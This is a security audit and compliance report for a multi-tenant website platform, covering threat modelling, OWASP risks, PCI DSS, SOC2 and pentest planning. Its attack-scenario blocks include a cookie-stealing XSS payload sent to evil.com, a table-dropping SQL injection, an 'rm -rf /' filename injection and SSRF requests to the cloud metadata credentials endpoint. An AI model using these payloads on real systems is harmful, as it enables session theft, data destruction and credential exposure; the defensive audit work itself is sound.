# SiteForge AI — Security Audit & Compliance Report

## Executive Summary

This document provides a comprehensive security audit of the SiteForge AI platform, covering vulnerability analysis, mitigation strategies, penetration testing recommendations, and compliance checklists for PCI DSS and SOC2.

---

## 1. Threat Model

### 1.1 Attack Surface Map

```
┌─────────────────── ATTACK SURFACE ───────────────────────────┐
│                                                               │
│  EXTERNAL                                                     │
│  ├── Public API endpoints (auth, industries, webhooks)        │
│  ├── CDN/CloudFront (static assets, media)                    │
│  ├── DNS (domain resolution, subdomain takeover)              │
│  ├── Payment webhooks (Stripe, PayPal, Clover, NMI)          │
│  ├── POS webhooks (Clover, Square)                            │
│  └── OAuth callbacks (Google, GitHub)                         │
│                                                               │
│  INTERNAL (Service-to-Service)                                │
│  ├── API Gateway → 27 microservices                           │
│  ├── Kafka event bus (event injection)                        │
│  ├── Redis (cache poisoning, session hijack)                  │
│  ├── PostgreSQL databases (9 clusters)                        │
│  └── S3 buckets (unauthorized access)                         │
│                                                               │
│  SUPPLY CHAIN                                                 │
│  ├── npm dependencies                                         │
│  ├── Docker base images                                       │
│  ├── Terraform modules                                        │
│  └── CI/CD pipeline                                           │
└───────────────────────────────────────────────────────────────┘
```

### 1.2 Trust Boundaries

| Boundary | From | To | Controls |
|----------|------|-----|----------|
| Internet → API Gateway | Untrusted | Semi-trusted | WAF, Rate limiting, TLS, CORS |
| API Gateway → Services | Semi-trusted | Trusted | JWT validation, header injection, circuit breaker |
| Service → Database | Trusted | Trusted | Connection pooling, encrypted connections, least-privilege |
| Service → Redis | Trusted | Trusted | AUTH, encrypted, network policy |
| Service → Kafka | Trusted | Trusted | SASL/SCRAM, TLS, ACLs |
| Service → S3 | Trusted | Trusted | IRSA, bucket policy, encryption |

---

## 2. Vulnerability Assessment (OWASP Top 10 + Custom)

### 2.1 A01:2021 — Broken Access Control [CRITICAL]

**Multi-Tenant IDOR Risk:**
The #1 risk for this platform. A tenant user could access another tenant's data.

**Attack Scenarios:**
```
# Scenario 1: Direct Object Reference
GET /api/v1/orders/order-uuid-from-tenant-B
# If only order ID is checked without tenant validation, data leaks

# Scenario 2: Parameter Tampering
PUT /api/v1/products/123
X-Tenant-ID: attacker-tenant-id
# Attacker changes tenant header to access other tenant's product

# Scenario 3: Mass Assignment
POST /api/v1/users/me
{ "tenantMemberships": [{"tenantId": "other-tenant", "roleId": "owner"}] }
# Attacker tries to add themselves to another tenant
```

**Mitigations Implemented:**
- ✅ `tenantMiddleware` enforces tenant context on every authenticated request
- ✅ All Prisma queries include `WHERE tenantId = ?` via service layer
- ✅ Tenant ID extracted from JWT, not from request headers/body (Gateway sets it)
- ✅ Mass assignment protection via Zod schemas (only allow specific fields)
- ✅ Ownership validation on update/delete operations
- ✅ S3 paths scoped to tenant: `/{tenant-id}/products/...`

**Remaining Recommendations:**
- [ ] Add automated IDOR tests: for every endpoint, verify cross-tenant access returns 403
- [ ] Implement row-level security in PostgreSQL as defense-in-depth
- [ ] Add tenant ID to all log entries for audit correlation

### 2.2 A02:2021 — Cryptographic Failures [HIGH]

**Attack Scenarios:**
- Weak password hashing allows rainbow table attacks
- JWT secret compromise exposes all sessions
- Sensitive data in logs

**Mitigations Implemented:**
- ✅ bcrypt with 12 rounds for password hashing
- ✅ JWT HS256 with strong secret (env variable, Secrets Manager in prod)
- ✅ TLS 1.3 enforced for all connections (HSTS preload)
- ✅ AES-256 encryption at rest (RDS, S3)
- ✅ Sensitive fields redacted in logs (password, token, secret)
- ✅ No card data stored (tokenization via payment providers)
- ✅ MFA secrets encrypted, backup codes hashed

**Remaining Recommendations:**
- [ ] Rotate JWT secrets on a schedule (use RS256 with key rotation)
- [ ] Implement envelope encryption for sensitive JSONB fields
- [ ] Use AWS KMS for encryption key management
- [ ] Add TLS certificate pinning for service-to-service communication

### 2.3 A03:2021 — Injection [HIGH]

**Attack Scenarios:**
```
# SQL Injection (mitigated by Prisma ORM)
GET /api/v1/products?search='; DROP TABLE products; --

# NoSQL/JSONB Injection
POST /api/v1/websites/123/structure
{ "sections": {"$gt": ""} }

# XSS via stored content
PUT /api/v1/websites/123/pages/456/sections
{ "content": "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>" }

# Command Injection via file upload
POST /api/v1/media/upload
filename: "image.jpg; rm -rf /"
```

**Mitigations Implemented:**
- ✅ Prisma ORM with parameterized queries (no raw SQL)
- ✅ Zod validation on all inputs with strict schemas
- ✅ XSS pattern detection in API Gateway (`inputSanitization` middleware)
- ✅ SQL pattern detection in query parameters
- ✅ Content-Security-Policy headers via Helmet
- ✅ File upload: MIME type validation, size limits
- ✅ Output encoding in sanitizeInput utility

**Remaining Recommendations:**
- [ ] Add DOMPurify for HTML content in website builder sections
- [ ] Implement Content-Type validation on all API responses
- [ ] Add ClamAV virus scanning for file uploads (Lambda trigger on S3)
- [ ] Use prepared statements for any future raw queries

### 2.4 A04:2021 — Insecure Design [MEDIUM]

**Attack Scenarios:**
- Brute-force login attempts
- Account enumeration via registration/forgot-password timing
- AI credit abuse (generate thousands of websites)
- Bulk upload DoS (huge CSV files)

**Mitigations Implemented:**
- ✅ Account lockout after 5 failed attempts (30min cooldown)
- ✅ Rate limiting: public 30/min, authenticated 100/min, premium 500/min
- ✅ Forgot-password returns same response whether email exists or not
- ✅ AI jobs deduct credits before processing
- ✅ Bulk upload size limits and async processing via queue
- ✅ Circuit breaker prevents cascade failures

**Remaining Recommendations:**
- [ ] Add CAPTCHA for login after 3 failed attempts
- [ ] Implement progressive delays on failed login (exponential backoff)
- [ ] Add anomaly detection for unusual API patterns
- [ ] Implement request signing for admin operations

### 2.5 A05:2021 — Security Misconfiguration [MEDIUM]

**Mitigations Implemented:**
- ✅ Helmet.js with strict CSP, HSTS, X-Frame-Options DENY
- ✅ CORS whitelist (only allowed origins)
- ✅ No debug mode in production
- ✅ Docker non-root user
- ✅ No default credentials (environment variables)
- ✅ HPP (HTTP Parameter Pollution) protection

**Remaining Recommendations:**
- [ ] Disable unnecessary HTTP methods (TRACE, OPTIONS on non-CORS routes)
- [ ] Remove all `X-Powered-By` headers (done via Helmet)
- [ ] Implement automated security configuration scanning (CIS benchmarks)
- [ ] Regular rotation of all credentials

### 2.6 A06:2021 — Vulnerable Components [MEDIUM]

**Mitigations Implemented:**
- ✅ npm audit in CI pipeline
- ✅ Trivy container image scanning
- ✅ Dependabot for dependency updates
- ✅ Pinned dependency versions

**Remaining Recommendations:**
- [ ] Set up Snyk for real-time vulnerability monitoring
- [ ] Use official Node.js Docker images with security patches
- [ ] Review and minimize dependency tree
- [ ] License compliance scanning

### 2.7 A07:2021 — Authentication Failures [CRITICAL]

**Attack Scenarios:**
```
# Credential stuffing
POST /api/v1/auth/login (automated with leaked credential lists)

# JWT token theft
# If XSS exists, attacker steals token from localStorage

# Refresh token replay
POST /api/v1/auth/refresh (replay old refresh token)

# MFA bypass
# Attacker social-engineers backup codes
```

**Mitigations Implemented:**
- ✅ Strong password policy (8+ chars, uppercase, lowercase, number, special)
- ✅ MFA via TOTP (speakeasy) with backup codes
- ✅ JWT with short expiry (15min access, 7d refresh)
- ✅ Refresh token rotation (old token invalidated on refresh)
- ✅ Token blacklisting via Redis on logout
- ✅ Session tracking with device info and IP
- ✅ Account lockout mechanism
- ✅ Secure cookie options (HttpOnly, Secure, SameSite)

**Remaining Recommendations:**
- [ ] Implement device fingerprinting for session anomaly detection
- [ ] Add login notification emails for new devices
- [ ] Implement WebAuthn/FIDO2 as additional MFA option
- [ ] Add session limit (max 5 active sessions per user)

### 2.8 A08:2021 — Software & Data Integrity [HIGH]

**Attack Scenarios:**
- Webhook spoofing (fake payment success events)
- CI/CD pipeline compromise
- Docker image tampering

**Mitigations Implemented:**
- ✅ Webhook signature verification per payment provider
- ✅ Idempotency keys on all payment operations
- ✅ Payment webhook logs for audit trail
- ✅ Docker image scanning in CI

**Remaining Recommendations:**
- [ ] Sign Docker images with Docker Content Trust (DCT)
- [ ] Implement Sigstore for supply chain integrity
- [ ] Add commit signing requirement
- [ ] Use GitHub branch protection rules (require reviews, status checks)

### 2.9 A09:2021 — Security Logging & Monitoring [MEDIUM]

**Mitigations Implemented:**
- ✅ Centralized Audit Service logging all mutations
- ✅ Request correlation IDs (X-Correlation-ID)
- ✅ OpenTelemetry distributed tracing
- ✅ Prometheus metrics + Grafana dashboards
- ✅ Failed login attempt logging
- ✅ Rate limit hit logging

**Remaining Recommendations:**
- [ ] Set up PagerDuty alerts for: >10 failed logins/minute, payment anomalies, circuit breaker opens
- [ ] Implement SIEM integration (e.g., AWS SecurityHub)
- [ ] Add honeypot endpoints for early intrusion detection
- [ ] Log retention: 90 days hot, 1 year cold (S3 Glacier)

### 2.10 A10:2021 — SSRF [HIGH]

**Attack Scenarios:**
```
# SSRF via webhook URL
POST /api/v1/pos/connect
{ "webhookUrl": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }

# SSRF via image generation
POST /api/v1/ai/generate/image
{ "sourceUrl": "http://internal-service:3001/admin/secrets" }

# SSRF via domain verification
POST /api/v1/domains/verify
{ "domain": "http://10.0.0.1:5432" }
```

**Mitigations Implemented:**
- ✅ SSRF protection middleware blocks private IP ranges (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x)
- ✅ URL validation in webhook registration
- ✅ Network policies in K8s restrict egress

**Remaining Recommendations:**
- [ ] Use DNS resolution validation (resolve URL, check IP is public)
- [ ] Implement URL allowlisting for POS integrations
- [ ] Use a dedicated egress proxy for external HTTP calls
- [ ] Block metadata service access via IMDSv2 enforcement on EC2/EKS

---

## 3. Multi-Tenant Security Audit

### 3.1 Data Isolation Matrix

| Layer | Isolation Method | Verification |
|-------|-----------------|-------------|
| API | Tenant ID from JWT (not user-supplied) | ✅ Gateway extracts, services read from header |
| Database | WHERE tenantId = ? on all queries | ✅ Service layer enforces |
| Cache | Key prefix includes tenantId | ✅ `sf:cache:product:{tenantId}:{id}` |
| Storage | S3 prefix: `/{tenantId}/` | ✅ Media service validates path |
| Events | Kafka message key = tenantId | ✅ Consumer filters by tenant |
| Logs | Tenant ID in all log entries | ✅ Request logger includes tenantId |

### 3.2 Cross-Tenant Attack Tests (Recommended)

```yaml
# Test Suite: Cross-Tenant Isolation
tests:
  - name: "Cannot read another tenant's order"
    setup: Create order in Tenant-A
    action: GET /api/v1/orders/{order-id} with Tenant-B JWT
    expected: 404 (not 403, to avoid information leakage)

  - name: "Cannot update another tenant's product"
    setup: Create product in Tenant-A
    action: PUT /api/v1/products/{product-id} with Tenant-B JWT
    expected: 404

  - name: "Cannot access another tenant's S3 files"
    setup: Upload file in Tenant-A
    action: GET /api/v1/media/{file-id}/signed-url with Tenant-B JWT
    expected: 404

  - name: "Cannot install plugin with wrong tenant context"
    action: POST /api/v1/plugins/123/install with manipulated X-Tenant-ID header
    expected: JWT tenant takes precedence (header ignored by gateway)

  - name: "Kafka events only processed for correct tenant"
    setup: Publish order.created for Tenant-A
    verify: Tenant-B's inventory not affected

  - name: "Cannot enumerate tenants via API"
    action: GET /api/v1/tenants (should only return user's tenants)
    expected: Only tenants where user has membership
```

---

## 4. Payment Security Audit

### 4.1 PCI DSS Compliance Checklist

| Req# | Requirement | Status | Implementation |
|------|------------|--------|---------------|
| 1.1 | Firewall/network segmentation | ✅ | K8s NetworkPolicy isolates payment-service namespace |
| 1.2 | Restrict connections to CDE | ✅ | Only order-service → payment-service communication allowed |
| 2.1 | No vendor defaults | ✅ | All credentials via AWS Secrets Manager |
| 3.1 | No storage of sensitive auth data | ✅ | No PAN, CVV, PIN stored. Tokenization via Stripe/providers |
| 3.4 | Render PAN unreadable | ✅ | Only last4 digits stored (cardLast4 field) |
| 4.1 | Encrypt transmission | ✅ | TLS 1.3 everywhere, mTLS between services (Istio) |
| 6.1 | Identify vulnerabilities | ✅ | npm audit, Trivy, Dependabot in CI |
| 6.5 | Secure coding practices | ✅ | Parameterized queries, input validation, OWASP controls |
| 7.1 | Restrict access to CDE | ✅ | RBAC: only OWNER/ADMIN can manage payment settings |
| 8.1 | Unique user IDs | ✅ | UUID per user, MFA enforced for admin |
| 8.5 | MFA for admin access | ✅ | TOTP MFA with backup codes |
| 10.1 | Audit trail | ✅ | All payment operations logged in audit_db |
| 10.2 | Log access to cardholder data | ✅ | Payment service logs all operations |
| 10.7 | Retain logs 1 year | ⚠️ | Configure log retention policy in OpenSearch |
| 11.2 | Network vulnerability scans | ⚠️ | Schedule quarterly ASV scans |
| 12.1 | Security policy | ⚠️ | Document and publish security policy |

### 4.2 Payment-Specific Vulnerabilities

| Vulnerability | Risk | Mitigation |
|--------------|------|-----------|
| Double charge | HIGH | Idempotency keys on all payment endpoints; DB unique constraint |
| Refund fraud | HIGH | Refund amount <= original payment; requires ADMIN role; audit logged |
| Webhook spoofing | CRITICAL | Verify webhook signatures: Stripe-Signature, PayPal-Auth-Algo |
| Race condition on payment | HIGH | Database transaction with SELECT FOR UPDATE on order status |
| Price manipulation | HIGH | Server-side price calculation; never trust client-side totals |
| Currency conversion exploit | MEDIUM | Lock exchange rate at order creation time |

---

## 5. SOC2 Compliance Checklist

### 5.1 Security (Common Criteria)

| Control | Status | Implementation |
|---------|--------|---------------|
| CC1.1 - Entity demonstrates commitment to integrity | ✅ | Code review process, security training |
| CC5.1 - Logical access controls | ✅ | RBAC, MFA, JWT, API keys |
| CC6.1 - Encryption in transit | ✅ | TLS 1.3, HSTS, mTLS |
| CC6.2 - Encryption at rest | ✅ | AES-256 for RDS, S3, Redis |
| CC6.3 - Encryption key management | ✅ | AWS KMS, Secrets Manager |
| CC7.1 - Detect security events | ✅ | Audit logging, Prometheus alerts |
| CC7.2 - Monitor for anomalies | ⚠️ | GuardDuty enabled, SIEM pending |
| CC7.3 - Evaluate identified events | ⚠️ | Incident response procedure needed |
| CC8.1 - Test changes | ✅ | CI/CD with automated testing |

### 5.2 Availability

| Control | Status | Implementation |
|---------|--------|---------------|
| A1.1 - Processing capacity | ✅ | HPA auto-scaling, Cluster Autoscaler |
| A1.2 - Recovery objectives | ✅ | Multi-AZ RDS, cross-region S3 replication |
| A1.3 - Restore from backups | ✅ | RDS automated backups (35-day retention) |

### 5.3 Processing Integrity

| Control | Status | Implementation |
|---------|--------|---------------|
| PI1.1 - Processing completeness | ✅ | Saga pattern for distributed transactions |
| PI1.2 - Accurate processing | ✅ | Idempotent operations, event sourcing for AI versions |
| PI1.3 - Timely processing | ✅ | SLA monitoring via Prometheus |

### 5.4 Confidentiality

| Control | Status | Implementation |
|---------|--------|---------------|
| C1.1 - Confidential information | ✅ | Tenant data isolation, S3 access controls |
| C1.2 - Disposal of confidential data | ⚠️ | Account deletion soft-deletes, hard-delete policy needed |

### 5.5 Privacy

| Control | Status | Implementation |
|---------|--------|---------------|
| P1.1 - Privacy notice | ⚠️ | Privacy policy needed |
| P3.1 - Personal data collection | ✅ | Minimal data collection, purpose-limited |
| P4.1 - Use of personal data | ✅ | Data used only for service operation |
| P6.1 - Data deletion | ✅ | Account deletion API, data export API |

---

## 6. Penetration Testing Recommendations

### 6.1 Test Categories

| Category | Priority | Scope |
|----------|----------|-------|
| Multi-tenant IDOR | P0 | All 28 services, every endpoint |
| Authentication bypass | P0 | Auth service, JWT validation, MFA |
| Payment fraud | P0 | Payment, refund, wallet services |
| Injection (SQLi, XSS, SSRF) | P1 | API Gateway, all input fields |
| Privilege escalation | P1 | Role service, RBAC checks |
| Business logic abuse | P1 | Order creation, pricing, discounts |
| API abuse | P2 | Rate limiting, bulk operations |
| File upload exploitation | P2 | Media service, bulk upload |
| Infrastructure | P2 | K8s, Docker, AWS configuration |

### 6.2 Recommended Testing Tools

| Tool | Purpose |
|------|---------|
| Burp Suite Pro | Web application testing, IDOR detection |
| OWASP ZAP | Automated DAST scanning |
| Nuclei | Template-based vulnerability scanning |
| kube-hunter | Kubernetes cluster security |
| Trivy | Container and dependency scanning |
| Semgrep | SAST (static analysis) |
| SQLMap | SQL injection testing (against test env) |
| Postman/Newman | API security test automation |

### 6.3 Automated Security Test Suite

```yaml
# security-tests.yml - Run in CI
name: Security Tests
schedule:
  - weekly (DAST)
  - per-commit (SAST, dependency audit)
  - quarterly (full penetration test)

tests:
  sast:
    - semgrep --config=p/owasp-top-ten
    - semgrep --config=p/nodejs
    - eslint-plugin-security

  dast:
    - owasp-zap-baseline against staging
    - nuclei templates for API vulnerabilities

  dependency:
    - npm audit --audit-level=high
    - trivy image scan (all services)
    - snyk test

  infrastructure:
    - kube-hunter (K8s cluster)
    - prowler (AWS security audit)
    - tfsec (Terraform security)

  custom:
    - cross-tenant-idor-tests
    - payment-fraud-tests
    - rate-limit-bypass-tests
    - mfa-bypass-tests
```

---

## 7. Security Hardening Checklist

### 7.1 Application Layer
- [x] Input validation on all endpoints (Zod)
- [x] Output encoding (sanitizeInput)
- [x] CSRF protection (SameSite cookies)
- [x] Content-Security-Policy headers
- [x] Rate limiting (Redis sliding window)
- [x] Request size limits (10MB)
- [ ] Request signing for admin operations
- [ ] API versioning with deprecation policy

### 7.2 Infrastructure Layer
- [x] Non-root Docker containers
- [x] Read-only filesystem in production
- [x] Network policies (default deny)
- [x] Pod security standards
- [ ] Seccomp profiles for containers
- [ ] AppArmor profiles
- [ ] Runtime security monitoring (Falco)

### 7.3 Data Layer
- [x] Encryption at rest (RDS, S3)
- [x] Encryption in transit (TLS 1.3)
- [x] Connection pooling with SSL
- [x] Least-privilege database users
- [ ] Database activity monitoring
- [ ] Automated backup testing

### 7.4 Operational Security
- [x] Centralized logging
- [x] Distributed tracing
- [x] Health checks and alerting
- [ ] Incident response playbook
- [ ] Regular security training
- [ ] Bug bounty program
- [ ] Chaos engineering tests

---

## 8. Incident Response Plan

### 8.1 Severity Levels

| Level | Description | Response Time | Example |
|-------|------------|---------------|---------|
| SEV-1 | Data breach, payment compromise | 15 minutes | Cross-tenant data leak |
| SEV-2 | Service outage, auth bypass | 30 minutes | JWT secret compromised |
| SEV-3 | Degraded service, rate limit bypass | 2 hours | Single service down |
| SEV-4 | Minor vulnerability, no exploitation | 24 hours | Outdated dependency |

### 8.2 Response Steps

1. **Detect** — Automated alerts (Prometheus, GuardDuty) or manual report
2. **Triage** — Assess severity, assign incident commander
3. **Contain** — Isolate affected service, rotate credentials if needed
4. **Eradicate** — Fix root cause, deploy patch
5. **Recover** — Restore service, verify fix
6. **Post-mortem** — Document timeline, root cause, prevention measures

---

## 9. Compliance Timeline

| Quarter | Activity |
|---------|----------|
| Q1 | Complete PCI DSS self-assessment, implement remaining controls |
| Q1 | SOC2 Type I audit preparation |
| Q2 | First penetration test (external firm) |
| Q2 | SOC2 Type I audit |
| Q3 | Remediate findings, implement SIEM |
| Q3 | Second penetration test |
| Q4 | SOC2 Type II observation period begins |
| Q4 | PCI DSS certification (if processing > threshold) |

---

*Last updated: 2026-03-31*
*Next review: 2026-06-30*
*Document owner: Security Team*
